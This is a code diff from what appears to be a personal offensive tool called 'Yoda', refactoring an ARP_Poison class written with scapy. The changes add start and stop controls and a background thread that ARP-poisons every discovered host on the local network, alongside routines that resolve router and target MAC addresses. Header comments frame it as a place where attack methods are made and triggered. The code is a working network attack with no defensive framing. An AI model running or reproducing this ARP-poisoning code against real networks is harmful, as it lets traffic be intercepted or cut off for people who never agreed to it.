@@ -1,6 +1,8 @@
 # THIS IS WHERE ATTACK METHODS ARE MADE AND TRIGGERED FROM YODA (VOICE TRIGGER)
 
 
+# THE SKILLS WILL PAY THE BILLS
+
 # Yoda IMPORTS //
 from nsm_modules.nsm_utilities import Connection_Handler 
 
@@ -47,8 +49,8 @@ class ARP_Poison():
         return random_ip
 
     
-    @staticmethod
-    def _get_macs(router_ip, target_ip, iface, verbose=True):
+    @classmethod
+    def _get_macs(cls, router_ip, target_ip, iface, verbose=True):
         """This module will be responsible for pulling macs from ips"""
 
         mac_node    = False
@@ -63,7 +65,8 @@ class ARP_Poison():
             pkt_to_node   = Ether(dst=broadcast) / ARP(pdst=str(target_ip))
 
             
-            while not mac_node or not mac_router:
+            while not mac_node or not mac_router and cls.attack_poison:
+                
                 
                 if not mac_node:
                     response_1 = srp(pkt_to_node, iface=iface)[0]
@@ -178,7 +181,7 @@ class ARP_Poison():
                 time.sleep(delay)
             
 
-            if tell: console.print(f"[{c2}][+] Revive:[{c1}] {target_ip}")
+            console.print(f"[{c2}][+] Revive:[{c1}] {target_ip}")
         
         except Exception as e:
             console.print(f"[bold red]Exception Error:[bold yellow] {e}")
@@ -186,7 +189,7 @@ class ARP_Poison():
 
     
     @classmethod
-    def main(cls, router_ip, iface):
+    def start(cls, router_ip, iface):
         """This will be the main controller method that calls upon sub methods"""
 
         
@@ -194,29 +197,45 @@ class ARP_Poison():
         nodes_attacked = []
 
 
-        while cls.attack_poison:
-            
-            nodes = Connection_Handler.nodes; print(nodes) if len(nodes_attacked) < 1 else None
-            
-            for key, value in nodes.items():
+        def _main(router_ip, iface):
 
 
-                target_ip = value["target_ip"]
+            console.print("\n\n[+] LAN Attack 1 Started\n\n", style="bold green")
+
+
+            while cls.attack_poison:
                 
+                nodes = Connection_Handler.nodes; print(nodes) if len(nodes_attacked) < 1 else None
                 
-                if cls.attack_poison and target_ip not in nodes_attacked: 
-                    nodes_attacked.append(target_ip)
-                    threading.Thread(target=ARP_Poison._attack_arp_poison, 
-                    args=(router_ip, target_ip, 
-                    iface, False
-                ), daemon=True).start()
-            
+                for key, value in nodes.items():
 
-            time.sleep(1)
+
+                    target_ip = value["target_ip"]
+                    
+                    
+                    if cls.attack_poison and target_ip not in nodes_attacked: 
+                        nodes_attacked.append(target_ip)
+                        threading.Thread(target=ARP_Poison._attack_arp_poison, 
+                        args=(router_ip, target_ip, 
+                        iface, False
+                    ), daemon=True).start()
+                
+
+                time.sleep(1)
         
 
+        threading.Thread(target=_main, args=(router_ip, iface), daemon=True).start()
+
         
 
+    @classmethod
+    def stop(cls):
+        """This will be responsible for stopping the arp poison attack"""
+
+
+        ARP_Poison.attack_poison = False; ARP_Poison.attack_scan   = False
+        console.print("\n\n[+] LAN Attack 1 Terminated\n\n", style="bold green")
+      
 
 
 class Yoda_Controller():
